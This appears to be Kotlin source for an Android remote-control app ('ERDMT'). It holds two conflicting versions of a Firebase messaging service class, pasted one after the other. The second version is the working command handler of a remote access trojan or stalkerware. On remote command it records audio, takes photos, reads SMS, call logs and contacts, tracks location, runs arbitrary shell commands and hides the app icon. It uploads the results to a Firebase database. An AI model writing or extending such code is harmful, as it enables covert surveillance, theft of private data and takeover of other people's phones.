package com.yourdomain.erdmt

import android.content.Intent
import android.util.Log
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.google.firebase.database.FirebaseDatabase

class RemoteCommandService : FirebaseMessagingService() {

    private val database = FirebaseDatabase.getInstance()
    private val deviceId = "device_${System.currentTimeMillis()}"

    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)

        Log.d("RemoteCommandService", "Message received from: ${remoteMessage.from}")

        // Handle data payload
        remoteMessage.data.let { data ->
            if (data.isNotEmpty()) {
                Log.d("RemoteCommandService", "Message data payload: $data")
                handleDataMessage(data)
            }
        }

        // Handle notification payload
        remoteMessage.notification?.let { notification ->
            Log.d("RemoteCommandService", "Message notification body: ${notification.body}")
            showNotification(notification.title ?: "ERDMT", notification.body ?: "New command received")
        }
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d("RemoteCommandService", "Refreshed token: $token")

        // Send token to Firebase Database
        sendTokenToDatabase(token)
    }

    private fun handleDataMessage(data: Map<String, String>) {
        val command = data["command"]
        val params = data["params"]

        Log.d("RemoteCommandService", "Command: $command, Params: $params")

        // Store command in Firebase for MainActivity to pick up
        val commandData = hashMapOf(
            "type" to (command ?: ""),
            "params" to params,
            "timestamp" to System.currentTimeMillis(),
            "sender" to "fcm"
        )

        database.reference.child("commands").child(deviceId).push().setValue(commandData)

        // Wake up the app if needed
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            putExtra("command", command)
            putExtra("params", params)
        }
        startActivity(intent)
    }

    private fun sendTokenToDatabase(token: String) {
        val tokenData = hashMapOf(
            "token" to token,
            "timestamp" to System.currentTimeMillis(),
            "deviceId" to deviceId
        )

        database.reference.child("devices").child(deviceId).child("fcmToken").setValue(token)
        database.reference.child("fcm_tokens").child(deviceId).setValue(tokenData)
    }

    private fun showNotification(title: String, body: String) {
        val notificationHelper = NotificationHelper(this)
        notificationHelper.showNotification(title, body)
    }
}
package com.yourdomain.erdmt

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import androidx.core.app.NotificationCompat
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.*

class RemoteCommandService : FirebaseMessagingService() {
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)
        
        val command = remoteMessage.data["command"]
        val params = remoteMessage.data["params"]
        
        if (!command.isNullOrEmpty()) {
            serviceScope.launch {
                executeCommand(command, params)
            }
        }
    }
    
    private suspend fun executeCommand(command: String, params: String?) {
        try {
            val result = when (command) {
                "get_info" -> getDeviceInfo()
                "mic_record" -> AudioRecorder.recordAudio(this, 10)
                "camera_capture" -> CameraCaptureActivity.capturePhoto(this)
                "read_sms" -> SmsReader.getRecentSms(this)
                "read_call_logs" -> CallLogReader.getRecentCalls(this)
                "read_contacts" -> ContactsReader.getAllContacts(this)
                "get_location" -> LocationHelper.getCurrentLocation(this)
                "list_installed_apps" -> AppsLister.getInstalledApps(this)
                "shell_exec" -> if (params != null) ShellExecutor.executeCommand(params) else "No command provided"
                "toggle_icon" -> IconToggler.toggleIcon(this, params == "show")
                else -> "Unknown command: $command"
            }
            
            sendResponse(command, result, true)
            logActivity("command_executed", "Command $command executed successfully")
            
        } catch (e: Exception) {
            sendResponse(command, "Error: ${e.message}", false)
            logActivity("command_error", "Command $command failed: ${e.message}")
        }
    }
    
    private fun getDeviceInfo(): String {
        return """
            Device: ${Build.MODEL}
            Manufacturer: ${Build.MANUFACTURER}
            Android: ${Build.VERSION.RELEASE}
            SDK: ${Build.VERSION.SDK_INT}
            Time: ${System.currentTimeMillis()}
        """.trimIndent()
    }
    
    private fun sendResponse(command: String, result: String, success: Boolean) {
        val deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
        val database = FirebaseDatabase.getInstance()
        
        val response = mapOf(
            "deviceId" to deviceId,
            "command" to command,
            "result" to result,
            "success" to success,
            "timestamp" to System.currentTimeMillis()
        )
        
        database.reference.child("responses").push().setValue(response)
    }
    
    private fun logActivity(type: String, message: String) {
        val deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
        val database = FirebaseDatabase.getInstance()
        
        val log = mapOf(
            "deviceId" to deviceId,
            "type" to type,
            "message" to message,
            "timestamp" to System.currentTimeMillis()
        )
        
        database.reference.child("logs").push().setValue(log)
    }
    
    override fun onNewToken(token: String) {
        super.onNewToken(token)
        val deviceId = android.provider.Settings.Secure.getString(contentResolver, android.provider.Settings.Secure.ANDROID_ID)
        FirebaseDatabase.getInstance().reference.child("devices").child(deviceId).child("fcmToken").setValue(token)
    }
}
